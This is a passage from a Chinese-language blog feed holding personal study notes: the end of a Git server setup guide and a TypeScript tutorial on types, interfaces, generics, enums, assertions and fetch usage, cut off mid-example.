init --bare runoob.git</span><br>Initialized empty Git repository in /home/gitrepo/runoob.git/<br></code></pre></td></tr></table></figure><p>以上命令Git创建一个空仓库，服务器上的Git仓库通常都以.git结尾。然后，把仓库所属用户改为git：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chown</span> -R git:git runoob.git</span><br></code></pre></td></tr></table></figure><p>克隆仓库</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>git clone git<span class="hljs-variable">@192</span>.<span class="hljs-number">168.45</span>.<span class="hljs-number">4</span><span class="hljs-symbol">:/home/gitrepo/runoob</span>.git<br><span class="hljs-title class_">Cloning</span> into <span class="hljs-string">&#x27;runoob&#x27;</span>...<br><span class="hljs-symbol">warning:</span> <span class="hljs-title class_">You</span> appear to have cloned an empty repository.<br><span class="hljs-title class_">Checking</span> connectivity... done.<br></code></pre></td></tr></table></figure><p>192.168.45.4 为 Git 所在服务器 ip ，你需要将其修改为你自己的 Git 服务 ip。</p><p>这样我们的 Git 服务器安装就完成。</p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typescript</title>
    <link href="/blog/2022/11/04/Typescript/"/>
    <url>/blog/2022/11/04/Typescript/</url>
    
    <content type="html"><![CDATA[<h1 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h1><p>辅助React（？）</p><h3 id="1-尝试ts"><a href="#1-尝试ts" class="headerlink" title="1 尝试ts"></a>1 尝试ts</h3><p><code>npm i -g typescript</code>：全局安装typescript</p><p><code>tsc --init</code>：初始化，生成tsconfig.json</p><p><code>tsc</code>：将ts文件转换为js文件</p><p><code>tsc -w</code>：自动编译：每当文件保存就会自动编译成js文件</p><h3 id="2-变量声明"><a href="#2-变量声明" class="headerlink" title="2 变量声明"></a>2 变量声明</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> url : <span class="hljs-built_in">string</span> = <span class="hljs-string">&#x27;https://api.thecatapi.com/v1/images/search&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">button</span>: <span class="hljs-title class_">HTMLButtonElement</span> | <span class="hljs-literal">null</span>  = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-接口和实现"><a href="#3-接口和实现" class="headerlink" title="3 接口和实现"></a>3 接口和实现</h3><p>定义任何东西的时候要注明类型，调用任何东西的时候要检查类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CatType</span> &#123;<br>    id : <span class="hljs-built_in">string</span>;<br>    url : <span class="hljs-built_in">string</span>;<br>    height : <span class="hljs-built_in">number</span>;<br>    width : <span class="hljs-built_in">number</span>;<br>    test? : <span class="hljs-built_in">boolean</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CatType</span> &#123;<br>    id : <span class="hljs-built_in">string</span>;<br>    url : <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>;<br>    <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span>, url: <span class="hljs-built_in">string</span>, height: <span class="hljs-built_in">number</span>, width: <span class="hljs-built_in">number</span></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">url</span> = url;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> = height;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> = width;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-修饰符、函数类型"><a href="#4-修饰符、函数类型" class="headerlink" title="4 修饰符、函数类型"></a>4 修饰符、函数类型</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WebDisplay</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">addData</span>(<span class="hljs-attr">data</span>:<span class="hljs-title class_">CatType</span>): <span class="hljs-built_in">void</span> &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-attr">cat</span>: <span class="hljs-title class_">Cat</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(data.<span class="hljs-property">id</span>, data.<span class="hljs-property">url</span>, data.<span class="hljs-property">height</span>, data.<span class="hljs-property">width</span>);<br>        <span class="hljs-keyword">const</span> tableRow : <span class="hljs-title class_">HTMLTableRowElement</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;tr&#x27;</span>);<br>        tableRow.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`</span><br><span class="hljs-string">            &lt;td&gt;<span class="hljs-subst">$&#123;cat.id&#125;</span>&lt;/td&gt;</span><br><span class="hljs-string">            &lt;td&gt;&lt;img src=&quot;<span class="hljs-subst">$&#123;cat.url&#125;</span>&quot; alt=&quot;cat&quot;&gt;&lt;/td&gt;</span><br><span class="hljs-string">            &lt;td&gt;<span class="hljs-subst">$&#123;cat.height.toString()&#125;</span>&lt;/td&gt;</span><br><span class="hljs-string">            &lt;td&gt;<span class="hljs-subst">$&#123;cat.width.toString()&#125;</span>&lt;/td&gt;</span><br><span class="hljs-string">            &lt;td&gt;<span class="hljs-subst">$&#123;cat.url&#125;</span>&lt;/td&gt;</span><br><span class="hljs-string">            &lt;td&gt;&lt;a href=&quot;#&quot;&gt;X&lt;/a&gt;&lt;/td&gt;</span><br><span class="hljs-string">        `</span>;<br>        tableBody?.<span class="hljs-title function_">appendChild</span>(tableRow);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">deleteData</span>(<span class="hljs-attr">deleteButton</span>: <span class="hljs-title class_">HTMLAnchorElement</span>): <span class="hljs-built_in">void</span> &#123;<br>        <span class="hljs-keyword">const</span> td = deleteButton.<span class="hljs-property">parentElement</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLTableCellElement</span>;<br>        <span class="hljs-keyword">const</span> tr = td.<span class="hljs-property">parentElement</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLTableRowElement</span>;<br>        tr.<span class="hljs-title function_">remove</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-fetch入门：接收api的数据"><a href="#5-fetch入门：接收api的数据" class="headerlink" title="5 fetch入门：接收api的数据"></a>5 fetch入门：接收api的数据</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> getJSON&lt;T&gt;(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-attr">response</span>: <span class="hljs-title class_">Response</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);<br>    <span class="hljs-keyword">const</span> <span class="hljs-attr">json</span>: <span class="hljs-title class_">Promise</span>&lt;T&gt; = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> json;<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params"></span>):<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> json : <span class="hljs-title class_">CatType</span>[] = <span class="hljs-keyword">await</span> getJSON&lt;<span class="hljs-title class_">CatType</span>[]&gt;(url);<br>        <span class="hljs-keyword">const</span> data : <span class="hljs-title class_">CatType</span> = json[<span class="hljs-number">0</span>];<br>        <span class="hljs-title class_">WebDisplay</span>.<span class="hljs-title function_">addData</span>(data);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span> | <span class="hljs-built_in">unknown</span>) &#123;<br>        <span class="hljs-keyword">let</span> message : <span class="hljs-built_in">string</span>;<br>        <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span>) &#123;<br>            message = error.<span class="hljs-property">message</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            message = <span class="hljs-title class_">String</span>(error);<br>        &#125;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-利用事件冒泡添加事件监听"><a href="#6-利用事件冒泡添加事件监听" class="headerlink" title="6 利用事件冒泡添加事件监听"></a>6 利用事件冒泡添加事件监听</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript">button?.<span class="hljs-property">addEventListener</span>&lt;<span class="hljs-string">&#x27;click&#x27;</span>&gt;(<span class="hljs-string">&#x27;click&#x27;</span>, getData);<br><br>tableBody?.<span class="hljs-property">addEventListener</span>&lt;<span class="hljs-string">&#x27;click&#x27;</span>&gt;(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ev: MouseEvent</span>) =&gt;</span> &#123;<br>    <span class="hljs-title class_">WebDisplay</span>.<span class="hljs-title function_">deleteData</span>(&lt;<span class="hljs-title class_">HTMLAnchorElement</span>&gt;ev.<span class="hljs-property">target</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="7-限定回调函数的参数和返回值"><a href="#7-限定回调函数的参数和返回值" class="headerlink" title="7 限定回调函数的参数和返回值"></a>7 限定回调函数的参数和返回值</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserName</span>(<span class="hljs-params">callback: (data: <span class="hljs-built_in">string</span>) =&gt; <span class="hljs-built_in">void</span></span>) &#123;<br>    <span class="hljs-comment">//...</span><br>&#125;<br><br><span class="hljs-title function_">getUserName</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">alert</span>(data);<br>&#125;);<br><br><span class="hljs-comment">// 报错</span><br><span class="hljs-title function_">getUserName</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">alert</span>(data*<span class="hljs-number">2</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="8-类型别名"><a href="#8-类型别名" class="headerlink" title="8 类型别名"></a>8 类型别名</h3><p>针对复杂的类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserID</span> = <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">userId: UserID</span>) &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-小技巧"><a href="#9-小技巧" class="headerlink" title="9 小技巧"></a>9 小技巧</h3><ol><li>在tsconfig中配置一个额外的选项：<code>&quot;noImplicitAny&quot;: true</code>，让编译器对类型做更加严格的验证</li><li>在tsconfig中配置一个额外的选项：<code>&quot;strictNullChecks&quot;: true</code>，除非明确指定值可以为空，否则赋予空值是非法的</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 指定</span><br><span class="hljs-keyword">let</span> <span class="hljs-attr">s</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>;<br><span class="hljs-comment">// 不指定</span><br><span class="hljs-keyword">let</span> s : <span class="hljs-built_in">string</span>;<br>s = <span class="hljs-string">&#x27;azure&#x27;</span>;<br>s = <span class="hljs-literal">null</span>;<br>s = undefine;<br></code></pre></td></tr></table></figure><ol start="3"><li>在使用第三方库时，可能库本身不是用ts编写的，但又想使用ts提供更完善的类型支持，可以安装由社区维护的类型定义包（DefinitelyTyped&#x2F;DefinitelyTyped），例如使用<code>npm install --save-dev @types/three</code>&#x2F;<code>npm install three --save</code></li></ol><h3 id="10-常用数据类型"><a href="#10-常用数据类型" class="headerlink" title="10 常用数据类型"></a>10 常用数据类型</h3><p>基础类型</p><ul><li>常用：boolean、number、string、array、enum、any、void</li><li>不常用：tuple、null、undefined、never</li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">20210701</span>;<br></code></pre></td></tr></table></figure><p>对象类型</p><p>简单理解interface 和 type 的区别：type 更强大，interface 可以进行<code>声明合并</code>，type 不行；一般声明都用interface，需要用到其他变量类型，type多一些。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hero</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">skill</span>: <span class="hljs-built_in">string</span>;<br>  skinNum?: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">say</span>(): <span class="hljs-built_in">string</span>; <span class="hljs-comment">// say函数返回值为string</span><br>  [<span class="hljs-attr">propname</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// 当前Hero可定义任意字符串类型的key</span><br>&#125;<br><span class="hljs-comment">// 继承</span><br><span class="hljs-keyword">interface</span> littleSoldier <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Hero</span> &#123;<br>  <span class="hljs-title function_">rush</span>(): <span class="hljs-built_in">string</span>;<br>&#125;<br><span class="hljs-comment">// 任意类型</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IAnyObject</span> &#123;<br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;<br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Hero</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>,<br>  <span class="hljs-attr">skill</span>: <span class="hljs-built_in">string</span>,<br>  skinNum?: <span class="hljs-built_in">number</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>数组类型</p><p>项目中常见的写法，需要声明<code>列表数据</code>类型：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IItem</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">isGod</span>: <span class="hljs-built_in">boolean</span>;<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">objectArr</span>: <span class="hljs-title class_">IItem</span>[] = [&#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;az&#x27;</span>, <span class="hljs-attr">isGod</span>: <span class="hljs-literal">true</span> &#125;];<br><span class="hljs-comment">// or</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">objectArr</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-title class_">IItem</span>&gt; = [&#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;az&#x27;</span>, <span class="hljs-attr">isGod</span>: <span class="hljs-literal">true</span> &#125;];<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">numberArr</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">arr</span>: (<span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">&quot;string&quot;</span>, <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>元组tuple</p><p>元组和数组类似，但是类型注解时会不一样，赋值的类型、位置、个数需要和定义（生明）的类型、位置、个数一致。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// 数组 某个位置的值可以是注解中的任何一个</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">LOL</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-string">&quot;zed&quot;</span>, <span class="hljs-number">25</span>, <span class="hljs-string">&quot;darts&quot;</span>];<br><br><span class="hljs-comment">// 元祖 每一项数据类型必须一致</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">LOL</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">&quot;zed&quot;</span>, <span class="hljs-string">&quot;darts&quot;</span>, <span class="hljs-number">25</span>];<br></code></pre></td></tr></table></figure><p>联合 | or 交叉&amp;类型</p><ul><li>联合类型：某个变量可能是多个 interface 中的其中一个，用 <code>|</code> 分割</li><li>交叉类型：由多个类型组成，用 <code>&amp;</code> 连接</li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Waiter</span> &#123;<br>  <span class="hljs-attr">anjiao</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">say</span>: <span class="hljs-function">() =&gt;</span> &#123;&#125;;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Teacher</span> &#123;<br>  <span class="hljs-attr">anjiao</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">skill</span>: <span class="hljs-function">() =&gt;</span> &#123;&#125;;<br>&#125;<br><br><span class="hljs-comment">// 联合类型</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeWho</span>(<span class="hljs-params">animal: Waiter | Teacher</span>) &#123;&#125;<br><span class="hljs-comment">// 交叉类型 </span><br><span class="hljs-comment">// 同名类型会进行合并，同名基础类型属性的合并返回：never</span><br><span class="hljs-comment">// 同名非基础类型属性可以正常合并</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeWho</span>(<span class="hljs-params">jishi: Waiter &amp; Teacher</span>) &#123;&#125;<br></code></pre></td></tr></table></figure><p>enum枚举</p><p>提高代码可维护性，统一维护某些枚举值，避免 <code>JiShi === 1</code>这种魔法数字。<code>JiShi === JiShiEnum.BLUEJ</code>这样写，老板一眼就知道我想找谁。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// 初始值默认为 0</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">JiShiEnum</span> &#123;<br>     <span class="hljs-variable constant_">REDJ</span>,<br>     <span class="hljs-variable constant_">BLUEJ</span>,<br>     <span class="hljs-variable constant_">GREENJ</span>,<br>&#125;<br><span class="hljs-comment">// 设置初始值</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">JiShiEnum</span> &#123;<br>     <span class="hljs-variable constant_">REDJ</span> = <span class="hljs-number">8</span>,<br>     <span class="hljs-variable constant_">BLUEJ</span>,<br>     <span class="hljs-variable constant_">GREENJ</span>,<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">jishi</span>: <span class="hljs-title class_">JiShiEnum</span> = <span class="hljs-title class_">JiShiENUM</span>.<span class="hljs-property">BLUE</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(jishi) <span class="hljs-comment">// 9</span><br><span class="hljs-comment">// 字符串枚举，每个都需要声明</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">JiShiEnum</span> &#123;<br>     <span class="hljs-variable constant_">REDJ</span> = <span class="hljs-string">&quot;8号&quot;</span>,<br>     <span class="hljs-variable constant_">BLUEJ</span> = <span class="hljs-string">&quot;9号&quot;</span>,<br>     <span class="hljs-variable constant_">GREENJ</span> = <span class="hljs-string">&quot;10号&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>泛型T(Type)</p><p>简单说就是：泛指的类型，不确定的类型，可以理解为一个<code>占位符</code>（使用T只是习惯，使用任何字母都行）</p><ul><li>K（Key）：表示对象中的键类型；</li><li>V（Value）：表示对象中的值类型；</li><li>E（Element）：表示元素类型。</li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// T 自定义名称</span><br><span class="hljs-keyword">function</span> myFun&lt;T&gt;(<span class="hljs-attr">params</span>: T[]) &#123;<br>  <span class="hljs-keyword">return</span> params;<br>&#125;<br>myFun &lt;<span class="hljs-built_in">string</span>&gt; ([<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&quot;456&quot;</span>]);<br><br><span class="hljs-comment">// 定义多个泛型</span><br><span class="hljs-keyword">function</span> join&lt;T, P&gt;(<span class="hljs-attr">first</span>: T, <span class="hljs-attr">second</span>: P) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;first&#125;</span><span class="hljs-subst">$&#123;second&#125;</span>`</span>;<br>&#125;<br>join &lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">string</span>&gt; (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>);<br></code></pre></td></tr></table></figure><p>断言</p><p>断言用来手动指定一个值的类型。<code>值 as 类型</code> or <code>&lt;类型&gt;值</code></p><p>注意在 tsx 语法中必须使用前者，即 值 as 类型。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeWho</span>(<span class="hljs-params">animal: Waiter | Teacher</span>) &#123;<br>  <span class="hljs-keyword">if</span> (animal.<span class="hljs-property">anjiao</span>) &#123;<br>    (animal <span class="hljs-keyword">as</span> <span class="hljs-title class_">Teacher</span>).<span class="hljs-title function_">skill</span>();<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    (animal <span class="hljs-keyword">as</span> <span class="hljs-title class_">Waiter</span>).<span class="hljs-title function_">say</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>in</p><p>在做类型保护事件，类似于数组和字符串的 <code>includes</code> 方法</p><p>也有遍历的作用，拿到ts类型定义的Key，获取Key还有个方法：keyof是取类型的key的联合类型 , in是遍历类型的key</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeWhoTwo</span>(<span class="hljs-params">animal: Waiter | Teacher</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;skill&quot;</span> <span class="hljs-keyword">in</span> animal) &#123;<br>    animal.<span class="hljs-title function_">skill</span>();<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    animal.<span class="hljs-title function_">say</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>void和never</p><p>返回值类型，也算是基础类型。没有返回值的函数: void</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果一个函数是永远也执行不完的，就可以定义返回值为 never</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">errorFuntion</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span 